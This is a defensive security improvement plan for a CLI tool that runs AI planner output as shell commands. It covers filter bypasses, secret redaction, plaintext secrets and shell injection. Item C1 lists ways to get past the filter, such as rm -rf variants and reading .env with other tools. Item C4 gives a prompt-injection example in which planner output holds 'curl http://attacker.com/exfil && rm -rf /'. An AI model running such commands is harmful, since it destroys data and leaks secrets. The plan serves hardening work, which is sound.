# FlowTask Security Improvement Plan

## Priority Legend

| Label      | Description                                                                   |
| ---------- | ----------------------------------------------------------------------------- |
| P-Critical | Immediate — active vulnerability, secret exposure, or command injection       |
| P-High     | Significant — weak security posture, data leakage risk, or missing validation |
| P-Medium   | Important — defense-in-depth hardening, reduced attack surface                |
| P-Low      | Nice-to-have — hardening, best practices, cleanup                             |

---

## P-Critical Items

### C1. SafetyChecker Pattern Bypass (P-Critical)

**Files:** `src/safety/safety-checker.ts:12-20`

**Problem:** Blocked patterns use `.includes()` on the raw string with zero normalization. Attackers trivially bypass every blocked pattern:

- `rm -rf /` blocked; `rm -rf /*`, `rm -rf $HOME`, `/bin/rm -rf /`, `rm -rf /; echo bypass` all pass
- `cat .env` blocked; `nl .env`, `head .env`, `tail .env`, `cat ./.env`, `base64 .env` all pass
- `printenv` blocked; `env`, `set`, `declare -x`, `echo $HOME`, `env \| grep API_KEY` all pass

**Action:**

1. Normalize the command before checking: collapse whitespace, resolve `./` and `$HOME` prefixes, trim quotes
2. Replace `.includes()` with regex word-boundary matching: `/\brm\s+-rf\s+\//` instead of `includes("rm -rf /")`
3. Add pattern coverage for common bypasses:
   - Relative paths: `cat ../../.env`, `cat ./.env`
   - Alternative tools: `nl`, `head`, `tail`, `less`, `more`, `base64`, `strings` for file reading
   - Environment inspection: `env`, `set`, `declare`, `compgen -v`, `echo $VAR`
   - Recursive delete variants: `rm -rf --no-preserve-root /`, `rm -rf /*`
   - Variable wrapping: `rm -rf "$HOME"`, `rm -rf /"tmp"`

---

### C2. Secret Redactor Missing Key API Key Formats (P-Critical)

**Files:** `src/safety/secret-redactor.ts:1-5`

**Problem:** Only 3 regex patterns exist. Common API key/token formats are completely missed:

- `sk-...` (OpenAI: `sk-proj-abc123...`)
- `ghp_...`, `ghs_...`, `ghr_...` (GitHub tokens)
- `xoxp-...`, `xoxb-...` (Slack tokens)
- `AKIA...` (AWS access keys)
- `-----BEGIN RSA PRIVATE KEY-----` (inline PEM keys)
- URLs with embedded credentials: `https://user:pass@host.com`
- Flag-based secrets: `--api-key sk-...`, `--password supersecret`

**Action:**

1. Add regex patterns for all common key formats:

```typescript
const SENSITIVE_PATTERNS = [
  // Existing env-var patterns
  /(?:TOKEN|SECRET|PASSWORD|API_KEY|PRIVATE_KEY|DATABASE_URL|ACCESS_KEY|SECRET_KEY)=.+$/gim,

  // OpenAI keys
  /\b(sk-(?:proj|org|live|sess)-[a-zA-Z0-9]{20,})\b/g,

  // GitHub tokens
  /\b(ghp_[a-zA-Z0-9]{36,})\b/g,
  /\b(ghs_[a-zA-Z0-9]{36,})\b/g,
  /\b(ghr_[a-zA-Z0-9]{36,})\b/g,

  // Slack tokens
  /\b(xox[baprs]-[a-zA-Z0-9]{10,})\b/g,

  // AWS keys
  /\b(AKIA[0-9A-Z]{16})\b/g,

  // PEM blocks
  /-----BEGIN\s(?:RSA\s)?PRIVATE\sKEY-----[\s\S]*?-----END\s(?:RSA\s)?PRIVATE\sKEY-----/g,

  // Credentials in URLs
  /https?:\/\/[^@\/\s]+:[^@\s]+@/g,

  // Flag-based secrets
  /(?:--(?:api-key|token|secret|password|key)|-[ptsk])\s+['"]?\S+['"]?/g,

  // Bearer tokens (fixed to match base64/JWT)
  /(?:Bearer\s+)[a-zA-Z0-9._\-\+\/=]+/g,
];
```

2. Fix the `redact` function's value detection (`src/safety/secret-redactor.ts:11-17`) — the current `match.replace(/\S+$/, "****")` does not handle all patterns correctly. Use a dedicated redaction function per pattern type.

3. Add test coverage for each pattern with sample keys.

---

### C3. Secrets Stored in Plaintext JSON (P-Critical)

**Files:** `src/config/secret-store.ts:44-48`

**Problem:** API keys are stored in `~/.flowtask/secrets.json` as a plain JSON dictionary with `null, 2` pretty-printing. No encryption, no OS keychain. Any process with user-level access can read all stored API keys.

**Action:**

1. **Immediate:** Set restrictive file permissions after writing:

   ```typescript
   await fs.writeFile(tmpPath, content, { encoding: "utf-8", mode: 0o600 });
   // Also chmod after rename:
   await fs.chmod(filePath, 0o600);
   ```

2. **Short-term:** Add encryption using Node.js `crypto` module with a key derived from a machine-specific secret or a user-provided passphrase:
   - Use `crypto.createCipheriv` with AES-256-GCM
   - Store the salt + IV + auth tag alongside the encrypted data
   - Derive encryption key from a configurable passphrase or system fingerprint

3. **Long-term:** Document OS keychain integration (macOS Keychain via `@aspect-build/rules_keychain` or similar) as the recommended approach for production use.

4. Fix the misleading `"secure store"` message in `src/cli/commands/setup.command.ts` until encryption is implemented.

---

### C4. Shell-Based Command Injection via Executors (P-Critical)

**Files:**

- `src/executor/shell-executor.ts:47,60` — `commands.join(" && ")` passed to `sh -c`
- `src/validation/validation-runner.ts:270` — validation commands passed to `sh -c`

**Problem:** User-defined commands (from AI planner output or config) are joined with `&&` and passed to `spawn(getShell(), [getShellCommandFlag(), command])`. Even though `shell: false` is set on the spawn options, the `sh -c` invocation receives the entire string and interprets all shell metacharacters (`;`, `|`, `||`, `&&`, backticks, `$()`, etc.).

A prompt injection attack against the AI planner could produce malicious validation commands like `ls || curl http://attacker.com/exfil && rm -rf /`.

**Action:**

1. **Immediate:** Add command sanitization that rejects shell metacharacters:

   ```typescript
   function isSafeCommand(cmd: string): boolean {
     // Reject shell metacharacters
     return !/[;&|`$(){}]/.test(cmd);
   }
   ```

2. Add validation in `src/schemas/task.schema.ts` to reject dangerous characters in command strings via zod refinement.

3. Implement `safeFrameCommand` in `src/validation/validation-runner.ts:477` (currently a no-op).

4. Consider using `spawn` without shell wrapper — parse the command into `[binary, ...args]` and spawn directly without `sh -c`.

---

### C5. Gemini API Key in URL Query String (P-Critical)

**File:** `src/ai/providers/gemini-provider.ts:88,219`

**Problem:** The API key is embedded directly in the URL query string:

```typescript
const url = `${this.baseUrl}/v1beta/models/${model}:generateContent?key=${this.apiKey}`;
```

API keys in URLs are:

- Logged in full by load balancers, proxies, API gateways, and monitoring tools
- Transmitted in `Referer` headers
- Visible in process listings
- Potentially cached by intermediate proxies

**Action:**

1. Use the `x-goog-api-key` header instead (Google's recommended auth method):

   ```typescript
   headers: {
     "Content-Type": "application/json",
     "x-goog-api-key": this.apiKey,
   }
   ```

   And use the URL without the `?key=` parameter.

2. Apply the same fix to all Gemini endpoints in the file (generate, stream, healthCheck).

---

### C6. Inconsistent Error Redaction in AI Providers (P-High)

**Files:**

- `src/ai/providers/anthropic-provider.ts:304-307` — `normalizeFetchError` does NOT redact error messages
- `src/ai/providers/gemini-provider.ts` — error messages may include URLs with API key
- `src/ai/ai-provider-error.ts:43-56` — `redactErrorMessage` only used in select paths
- `src/ai/providers/openai-compatible-provider.ts` — check for same pattern

**Problem:** Error messages in `normalizeFetchError` are not passed through `redactErrorMessage`. If network errors include URL fragments that contain API keys (especially critical for Gemini where the key is in the URL), the key leaks into logs and user-facing error messages. The `normalizeHttpError` method does redact, but `normalizeFetchError` does not.

**Action:**

1. Apply `redactErrorMessage` to ALL error messages in ALL providers, not just `normalizeHttpError`.
2. For Gemini: ensure the URL in error messages is redacted (the `?key=` parameter must be stripped).
3. Add a dedicated URL sanitizer: strip query parameters or redact values of known sensitive params.
4. Consider centralizing error normalization in a shared base class to avoid this class of bugs.

---

## P-High Items

### H1. No File Permission Restrictions on Secrets File (P-High)

**Files:** `src/config/secret-store.ts:44-48`, `src/utils/fs.ts:26-31`

**Problem:** `atomicWriteJsonFile` writes files with the default umask (typically `644` — world-readable). The secrets file at `~/.flowtask/secrets.json` is readable by all users on the system.

**Action:**

1. Add a `mode` parameter to `atomicWriteJsonFile`:
   ```typescript
   export async function atomicWriteJsonFile(
     filePath: string,
     data: unknown,
     mode?: number,
   ): Promise<void> {
     // ... write to tmp
     const writeOpts: { encoding: string; mode?: number } = { encoding: "utf-8" };
     if (mode !== undefined) writeOpts.mode = mode;
     await fs.writeFile(tmpPath, content, writeOpts);
     await fs.rename(tmpPath, filePath);
     if (mode !== undefined) await fs.chmod(filePath, mode);
   }
   ```
2. Call `atomicWriteJsonFile(this.filePath, data, 0o600)` from `secret-store.ts`.

---

### H2. `safeFrameCommand` Is a No-Op (P-High)

**File:** `src/validation/validation-runner.ts:477-479`

**Problem:** The function `safeFrameCommand(command) { return command; }` exists as a no-op. It is called before every validation command execution, creating the illusion of sanitization. Combined with the shell injection vulnerability (C4), this means there is zero command safety in the validation pipeline.

**Action:**

1. Implement proper command sanitization:
   - Validate the command is not empty
   - Reject shell metacharacters
   - Limit command length (reject > 32KB)
   - Log the sanitization attempt
2. Or remove the function entirely and add explicit validation at the call site.

---

### H3. Synchronous File Read for Credentials (P-High)

**File:** `src/config/credential-resolver.ts:18-27`

**Problem:** Uses `readFileSync` (not async) to read the secrets file. This blocks the event loop and is inconsistent with the codebase's convention of using async patterns. Also uses raw `JSON.parse` with no schema validation.

**Action:**

1. Replace `readFileSync` with async `fs.readFile` or the existing `readJsonFile` utility.
2. Add zod schema validation for the secrets file content: `z.record(z.string(), z.string())`.
3. Update `resolveCredentialSync` to be async, or create a cached credential resolver that loads once.

---

### H4. Environment Variables Leaked to Child Processes (P-High)

**Files:**

- `src/executor/shell-executor.ts:62-67`
- `src/executor/command-executor.ts:92-98`
- `src/validation/validation-runner.ts:264-268`

**Problem:** The full `process.env` is passed to ALL child processes via `{ ...process.env, ...input.env, ... }`. This leaks ALL environment variables (including API keys, database URLs, etc.) to every spawned subprocess.

**Action:**

1. Create a filtered environment builder:
   ```typescript
   function buildChildEnv(extra: Record<string, string | undefined>): Record<string, string> {
     // Start with a clean minimal environment
     const env: Record<string, string> = { PATH: process.env.PATH ?? "" };
     // Add only explicitly configured variables
     for (const [key, val] of Object.entries(extra)) {
       if (val !== undefined) env[key] = val;
     }
     return env;
   }
   ```
2. Or provide a configurable allowlist of environment variables to pass through.

---

### H5. Log Files World-Readable by Default (P-High)

**File:** `src/core/log-manager.ts`

**Problem:** Log files written via `appendToFile` use default umask permissions (typically `644`). These logs contain command output, error messages, and potentially redacted-but-reconstructable sensitive data.

**Action:**

1. Add file permission management to log directory creation:
   - Create log dirs with `0o700` (owner-only)
   - Write log files with `0o600` (owner read/write)
2. Add log retention: auto-rotate or archive logs older than N days (configurable).
3. Add log size limits: cap total log storage per run.

---

### H6. No `.env` File Validation (P-High)

**File:** `src/utils/env-loader.ts:4-35`

**Problem:** `.env` files are loaded without any permission checks, content validation, or user warning. Variables are blindly assigned to `process.env`. A `.env` file containing `LD_PRELOAD`, `PATH`, or `DYLD_INSERT_LIBRARIES` would be loaded without question.

**Action:**

1. Check file permissions before loading: warn if `.env` is world-readable or group-writable.
2. Filter/block dangerous environment variables (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, etc.).
3. Log a clear message when `.env` is loaded (using `logManager` or `console.warn`).
4. Add a config option to disable automatic `.env` loading.

---

### H7. Unbounded JSON Response Bodies (P-Medium)

**File:** `src/ai/providers/openai-compatible-provider.ts:248`, and all other providers

**Problem:** AI provider responses are fully buffered via `response.json()` with no size limit. A malicious or misconfigured provider could return a multi-gigabyte response, causing OOM.

**Action:**

1. Add content-length check before reading body:
   ```typescript
   const contentLength = response.headers.get("content-length");
   if (contentLength && parseInt(contentLength) > MAX_RESPONSE_BYTES) {
     throw new Error("Response body exceeds maximum allowed size");
   }
   ```
2. Use `response.text()` with a maximum length parameter instead of `response.json()`.

---

## P-Medium Items

### M1. Race Condition in Atomic Write (TOCTOU) (P-Medium)

**File:** `src/utils/fs.ts:26-31`

**Problem:** The `.tmp` filename is deterministic (`filePath + ".tmp"`), allowing concurrent writes to the same file to race. If the process crashes between `writeFile` and `rename`, a stale `.tmp` file is left behind.

**Action:**

1. Use a unique temporary filename: `${filePath}.${Date.now()}.${randomBytes(4).toString("hex")}.tmp`.
2. Clean up old `.tmp` files on read.
3. Add `fsync` after write to ensure the data is on disk before rename.

---

### M2. API Key in Process Environment Inherited (P-Medium)

**Files:** All executor and validation files

**Problem:** The full `process.env` is inherited by child processes. API keys loaded from `.env` or environment are available to any subprocess, including AI CLIs that may log their environment on `--verbose` mode.

**Action:**

1. Implement env filtering at a single point (e.g., a shared `createChildEnv` utility).
2. Document that API keys should use `.env` (which is filtered) rather than global env vars.
3. Consider using a dedicated env allowlist for child processes.

---

### M3. Context Pack Content in Command-Line Arguments (P-Medium)

**File:** `src/executor/build-command-args.ts:14-15`

**Problem:** In `"argument"` mode, the entire context pack content (user prompt + rules + project data) is appended as a command-line argument. This content is visible in `ps aux` process listings, command history, and system logs.

**Action:**

1. Default to `"stdin"` input mode instead of `"argument"`.
2. If `"argument"` mode must be used, truncate content to a safe maximum (e.g., 4KB).
3. Log a warning when sensitive content is passed as a command argument.

---

### M4. Gemini Health Check Uses API Key in URL (P-Medium)

**File:** `src/ai/providers/gemini-provider.ts:88`

**Problem:** Same as C5 — the health check method also uses `?key=${this.apiKey}` in the URL.

**Action:** Use `x-goog-api-key` header for health check requests as well.

---

### M5. Unsafe `FLOWTASK_SECRETS_PATH` Env Override (P-Medium)

**File:** `src/config/secret-store.ts:8-11`

**Problem:** The `FLOWTASK_SECRETS_PATH` env var allows redirecting the secrets file to any path. An attacker controlling environment variables can point this to a crafted file.

**Action:**

1. Validate the resolved path is within `~/.flowtask/` or an allowed directory.
2. Resolve and check: `path.resolve(envOverride).startsWith(path.resolve(homedir(), ".flowtask"))`.
3. Log a warning when using a non-default secrets path.

---

### M6. Prompt Not Sanitized for File Path Generation (P-Medium)

**File:** `src/core/run-manager.ts` (via `generateRunId`)

**Problem:** User prompts are used to generate directory names. A prompt containing `../`, null bytes, or other path traversal characters could affect file paths.

**Action:**

1. Sanitize the title before using it in path generation: remove or escape `/`, `\0`, `..`, and other path-sensitive characters.
2. Use a truncated and sanitized version (max 50 chars, alphanumeric + hyphens only).

---

### M7. Base URL Not Validated (SSRF Risk) (P-Medium)

**File:** `src/cli/commands/run.command.ts:58-59`

**Problem:** The `--planner-base-url` CLI flag sets `config.planner.baseUrl` and `config.ai.providers[].baseUrl` with no validation. An attacker can redirect API requests to arbitrary endpoints, exfiltrating API keys.

**Action:**

1. Validate the URL is a valid HTTPS URL (or `http://localhost` / `http://127.0.0.1` for local providers like Ollama).
2. Warn when using HTTP instead of HTTPS.
3. Add URL validation to the config schema (`src/schemas/config.schema.ts`).

---

### M8. Validation Commands Not Sanitized in Schema (P-Medium)

**File:** `src/schemas/task.schema.ts:15-20`

**Problem:** `ValidationConfigSchema.commands` accepts `z.array(z.string())` with no zod refinement that rejects dangerous shell characters.

**Action:**

1. Add a zod refinement:
   ```typescript
   .refine(
     (cmds) => cmds.every((c) => !/[;&|`$(){}]/.test(c)),
     { message: "Commands must not contain shell metacharacters" },
   )
   ```

---

### M9. Executor Command Not Validated in Schema (P-Medium)

**File:** `src/schemas/config.schema.ts:49-56`

**Problem:** `ExecutorEntrySchema.command` accepts `z.string().optional()` with no validation that the command is a safe/known binary.

**Action:**

1. Add validation: reject commands with shell metacharacters.
2. Consider validating that the command exists in PATH (optional, for startup warnings).

---

### M10. PID Tracking Vulnerable to PID Reuse (P-Medium)

**File:** `src/validation/validation-runner.ts:75,278-279`

**Problem:** The `activeProcesses` map stores PIDs after spawn. The OS can reuse PIDs after a process exits. Sending signals to a reused PID could kill an unrelated process.

**Action:**

1. Track process group IDs instead of PIDs: use `child.pid` with negative value for `process.kill(-child.pid, signal)`.
2. Or use `AbortController` exclusively (already partially used) and remove PID-based tracking.

---

### M11. Manual Executor Unbounded stdin Listener (P-Medium)

**File:** `src/executor/manual-executor.ts:17`

**Problem:** `process.stdin.once("data", ...)` blocks indefinitely with no timeout.

**Action:**

1. Add a configurable timeout (default 24h).
2. Add a cancellation mechanism via the existing `AbortSignal` support.

---

### M12. No Dependency Auditing (P-Medium)

**File:** `package.json`

**Problem:** No `pnpm audit` or dependency vulnerability scanning in the development workflow.

**Action:**

1. Add to `scripts` in `package.json`:
   ```json
   "audit": "pnpm audit"
   ```
2. Run `pnpm audit` as part of CI pipeline.
3. Consider adding `snyk` or Dependabot for continuous monitoring.

---

## P-Low Items

### L1. Error Oracle via Inconsistent Redaction (P-Low)

**File:** `src/ai/ai-provider-error.ts:43-56`

**Action:** Standardize error redaction across all providers. Use a central error handler.

### L2. Rigid Pattern Overmatching (P-Low)

**File:** `src/safety/safety-checker.ts:28-42`

**Action:** Use word-boundary regex for risky patterns to avoid false positives (e.g., `rm` matching `rmdir`).

### L3. Windows `shell: true` Fallback (P-Low)

**File:** `src/utils/process.ts:20,40,88`

**Action:** Test and validate Windows paths more rigorously.

### L4. Hardcoded Shell Paths (P-Low)

**File:** `src/utils/shell.ts:3-8`

**Action:** Consider `process.env.SHELL` as a fallback on Unix.

### L5. Misleading "Secure Store" Message (P-Low)

**File:** `src/cli/commands/setup.command.ts:249-253`

**Action:** Update CLI messages to say "plaintext store" or "local store" until encryption is implemented.

---

## Implementation Order

### Phase 1 — Immediate (Critical, do first)

| Item | Area                            | Effort |
| ---- | ------------------------------- | ------ |
| C1   | SafetyChecker pattern bypass    | ~2h    |
| C2   | SecretRedactor missing patterns | ~1h    |
| C4   | Shell injection in executors    | ~3h    |
| C5   | Gemini API key in URL           | ~0.5h  |
| C6   | Error redaction inconsistency   | ~2h    |

### Phase 2 — Short-term (High priority, do next)

| Item | Area                                   | Effort |
| ---- | -------------------------------------- | ------ |
| C3   | Secrets plaintext storage + file perms | ~4h    |
| H1   | File permission restrictions           | ~0.5h  |
| H2   | safeFrameCommand implementation        | ~1h    |
| H3   | Sync credential resolver → async       | ~1h    |
| H4   | Env filtering for child processes      | ~2h    |
| H5   | Log file permissions                   | ~1h    |
| H6   | .env validation                        | ~1h    |
| H7   | Response body size limits              | ~1h    |

### Phase 3 — Medium-term (Defense-in-depth)

| Item  | Area                                 | Effort |
| ----- | ------------------------------------ | ------ |
| M1    | Atomic write race condition          | ~1h    |
| M2    | Env inheritance hardening            | ~1h    |
| M3    | Context pack arg mode hardening      | ~0.5h  |
| M5    | Secrets path env override validation | ~0.5h  |
| M6    | Prompt sanitization                  | ~0.5h  |
| M7    | Base URL validation                  | ~0.5h  |
| M8-M9 | Schema-level command validation      | ~1h    |
| M10   | PID → process group tracking         | ~1h    |
| M11   | Manual executor timeout              | ~0.5h  |
| M12   | Dependency audit integration         | ~0.5h  |

### Phase 4 — Polish

| Item  | Area                   | Effort |
| ----- | ---------------------- | ------ |
| L1-L5 | Low-priority hardening | ~2h    |

---

## Verification

After each phase, verify:

1. `pnpm test` — all tests pass
2. `pnpm typecheck` — no type errors
3. `pnpm lint` — no lint errors
4. Manual test: attempt bypass of each blocked pattern (C1)
5. Manual test: inject sample API keys into stdout and verify redaction (C2)
6. Manual test: attempt command injection via planner output (C4)
7. Manual test: verify Gemini provider uses header auth (C5)
